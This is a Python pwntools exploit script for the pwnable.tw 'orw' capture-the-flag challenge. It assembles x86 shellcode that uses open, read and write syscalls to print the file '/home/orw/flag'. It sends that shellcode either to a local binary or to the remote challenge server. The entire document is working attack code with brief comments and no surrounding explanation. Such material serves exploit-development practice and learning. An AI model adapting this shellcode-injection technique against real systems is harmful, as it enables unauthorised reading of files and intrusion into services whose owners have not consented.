from pwn import *
import sys

HOST = 'chall.pwnable.tw'
PORT = 10001


def exploit(p):
    asm_code = []
    asm_code.append(asm('push ' + toval('ag')))     # push '/home/orw/flag'
    asm_code.append(asm('push ' + toval('w/fl')))
    asm_code.append(asm('push ' + toval('e/or')))
    asm_code.append(asm('push ' + toval('/hom')))
    asm_code.append(asm('mov ebx, esp'))        # pointer to file name
    asm_code.append(asm('xor ecx, ecx'))        # set read mode
    asm_code.append(asm('xor eax, eax'))
    asm_code.append(asm('mov al, 0x05'))
    asm_code.append(asm('int 0x80'))        # sys_open
    asm_code.append(asm('mov ebx, eax'))        # file descriptor
    asm_code.append(asm('mov ecx, esp'))        # buffer
    asm_code.append(asm('xor edx, edx'))
    asm_code.append(asm('mov dl, 0x80'))        # size
    asm_code.append(asm('xor eax, eax'))
    asm_code.append(asm('mov al, 0x03'))
    asm_code.append(asm('int 0x80'))        # sys_read
    asm_code.append(asm('mov ebx, 0x01'))   # stdout
    asm_code.append(asm('mov ecx, esp'))
    asm_code.append(asm('mov dl, 0x80'))
    asm_code.append(asm('xor eax, eax'))
    asm_code.append(asm('mov al, 0x04'))
    asm_code.append(asm('int 0x80'))        # sys_write
    p.send(''.join(asm_code))
    p.interactive()

def toval(in_str):
    if len(in_str)>4:
        raise Exception()
    rst = in_str
    while len(rst)<4:
        rst += '\0'
    return hex(u32(rst))

if __name__=='__main__':
    if len(sys.argv)==1:        # default local
        p = process(['./orw'])
        pause()
        exploit(p)
    elif sys.argv[1]=='remote':       # remote
        p = remote(HOST, PORT)
        exploit(p)
